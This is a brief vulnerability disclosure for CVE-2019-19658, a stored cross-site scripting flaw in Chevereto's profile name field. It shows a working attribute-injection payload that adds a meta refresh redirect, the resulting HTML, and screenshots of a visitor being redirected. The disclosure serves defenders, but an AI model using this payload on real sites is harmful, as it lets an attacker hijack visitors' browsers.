# CVE-2019-19658
Chevereto stored XSS in profile page - 1.0.0 - 1.1.4 Free, &lt;= 3.13.5 Core. A regular user can input HTML and script into their profile name and it will be executed on their profile page.

```
/settings/profile
```

Name:
```
0;https://www.google.se" http-equiv="refresh" data="
```

Result on profile page, which will redirect to Google:
```
<meta name="twitter:title" content="0;https://www.google.com" http-equiv="refresh" data=" (admin)">
```

</br></br>
Registered user injects some script into the name field, in this case to redirect the user to Google
<kbd>
  <img src="/xss-profile-1.png?raw=true">
</kbd>


</br></br>
Someone enters the profile of /test and is then redirected
<kbd>
  <img src="/xss-profile-2.png?raw=true">
</kbd>
